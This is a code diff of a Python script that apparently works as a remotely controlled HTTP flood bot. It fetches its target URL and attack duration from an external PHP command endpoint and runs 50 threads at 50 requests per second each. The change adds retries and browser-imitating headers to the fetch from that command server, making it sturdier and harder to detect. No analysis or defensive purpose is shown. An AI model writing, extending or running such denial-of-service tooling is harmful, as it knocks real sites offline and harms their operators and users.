@@ -10,6 +10,8 @@ init(autoreset=True)
 API_URL = "https://labaidgroup.com/files/google_security2025992852991526.php"
 THREADS = 50
 RPS_PER_THREAD = 50.0
+RETRY_LIMIT = 3
+RETRY_DELAY = 1
 
 class Stats:
     def __init__(self): self.t = self.e = 0; self.c = {}; self.l = threading.Lock()
@@ -26,27 +28,55 @@ def signal_handler(signum, frame):
     raise KeyboardInterrupt
 
 def fetch_config():
-    try:
-        req = urllib.request.Request(API_URL, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            xml_data = resp.read().decode('utf-8').strip()
-        print(f"{Fore.CYAN}Raw XML: {xml_data[:200]}...{Style.RESET_ALL}")
-        root = ET.fromstring(xml_data)
-        url_elem = root.find('url')
-        time_elem = root.find('time')
-        if url_elem is None or time_elem is None:
-            raise ValueError("Missing <url> or <time> element")
-        url = url_elem.text.strip() if url_elem.text else ""
-        if not url.startswith("http"): url = "https://" + url
-        dur = int(time_elem.text.strip()) if time_elem.text else 30
-        return url, dur
-    except ET.ParseError as e:
-        print(f"{Fore.RED}XML Parse Error: {e}")
-        print(f"{Fore.RED}Raw content: {xml_data if 'xml_data' in locals() else 'N/A'}{Style.RESET_ALL}")
-        sys.exit(1)
-    except Exception as e:
-        print(f"{Fore.RED}Failed to fetch config: {e}")
-        sys.exit(1)
+    attempt = 0
+    while attempt < RETRY_LIMIT:
+        try:
+            req = urllib.request.Request(
+                API_URL,
+                headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                }
+            )
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                raw = resp.read().decode('utf-8', errors='ignore').strip()
+            
+            if not raw or '<data>' not in raw:
+                raise ValueError("Invalid or empty response")
+
+            print(f"{Fore.CYAN}Raw XML: {raw[:200]}{'...' if len(raw) > 200 else ''}{Style.RESET_ALL}")
+
+            root = ET.fromstring(raw)
+            url_elem = root.find('url')
+            time_elem = root.find('time')
+
+            if url_elem is None or time_elem is None:
+                raise ValueError("Missing <url> or <time>")
+
+            url = url_elem.text.strip() if url_elem.text else ""
+            if not url.startswith("http"):
+                url = "https://" + url
+            dur = int(time_elem.text.strip())
+
+            return url, dur
+
+        except ET.ParseError as e:
+            print(f"{Fore.RED}XML Parse Error (Attempt {attempt + 1}): {e}")
+            print(f"{Fore.RED}Raw: {raw if 'raw' in locals() else 'N/A'}{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}Fetch failed (Attempt {attempt + 1}): {e}")
+        
+        attempt += 1
+        if attempt < RETRY_LIMIT:
+            time.sleep(RETRY_DELAY)
+
+    print(f"{Fore.RED}Failed to fetch config after {RETRY_LIMIT} attempts{Style.RESET_ALL}")
+    sys.exit(1)
 
 def worker(tid, url, dur, stats, stop, last, target_rps):
     browser = None
